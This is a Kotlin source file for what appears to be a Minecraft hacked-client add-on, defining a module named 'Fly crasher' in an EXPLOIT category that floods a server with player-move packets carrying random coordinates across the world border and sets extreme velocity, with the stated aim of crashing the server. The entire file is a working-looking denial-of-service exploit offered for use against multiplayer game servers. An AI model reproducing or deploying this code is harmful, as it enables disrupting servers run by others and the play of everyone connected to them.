package de.florianmichael.tarasande_crasher.module

import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket
import net.minecraft.util.math.Vec3d
import net.tarasandedevelopment.tarasande.event.EventMovement
import net.tarasandedevelopment.tarasande.mc
import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueNumber
import net.tarasandedevelopment.tarasande.system.feature.modulesystem.Module
import net.tarasandedevelopment.tarasande.system.feature.modulesystem.ModuleCategory
import su.mandora.event.EventDispatcher
import java.util.concurrent.ThreadLocalRandom
import kotlin.math.cos
import kotlin.math.sin

class ModuleFlyCrasher : Module("Fly crasher", "Crashes the server using big motions", ModuleCategory.EXPLOIT) {

    private val repeat = ValueNumber(this, "Repeat", 1.0, 3.0, 10.0, 1.0)

    private var trackedX: Double = 0.0
    private var trackedY: Double = 0.0
    private var trackedZ: Double = 0.0

    private var direction: Double = 0.0

    init {
        registerEvent(EventMovement::class.java) {
            for (i in 0 until repeat.value.toInt()) {
                trackedX = ThreadLocalRandom.current().nextDouble(-mc.world!!.worldBorder.size, mc.world!!.worldBorder.size)
                trackedY = ThreadLocalRandom.current().nextDouble(-mc.world!!.worldBorder.size, mc.world!!.worldBorder.size)
                trackedZ = ThreadLocalRandom.current().nextDouble(-mc.world!!.worldBorder.size, mc.world!!.worldBorder.size)

                mc.networkHandler!!.sendPacket(PlayerMoveC2SPacket.PositionAndOnGround(trackedX, trackedY, trackedZ, mc.player!!.isOnGround))
            }
            it.velocity = Vec3d(trackedX, trackedY, trackedZ)

            trackedX += cos(direction) * 5
            trackedZ += sin(direction) * 5
        }
    }

    override fun onEnable() {
        super.onEnable()

        trackedX = mc.player!!.x
        trackedY = mc.player!!.y
        trackedZ = mc.player!!.z

        direction = ThreadLocalRandom.current().nextDouble(-180.0, 180.0)
    }
}
